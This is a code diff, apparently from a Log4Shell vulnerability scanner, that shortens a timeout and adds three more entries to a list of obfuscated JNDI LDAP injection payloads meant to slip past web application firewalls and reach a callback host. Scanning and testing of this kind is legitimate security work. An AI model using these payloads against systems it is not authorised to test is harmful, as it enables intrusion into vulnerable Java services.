@@ -48,7 +48,7 @@ default_headers = {
 }
 
 post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
-timeout = 4
+timeout = 3
 
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
@@ -72,7 +72,10 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
                        "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                        "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
-                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
+                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}",
+                       "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",
+                       "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
+                       "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                        ]
 
 cve_2021_45046 = [
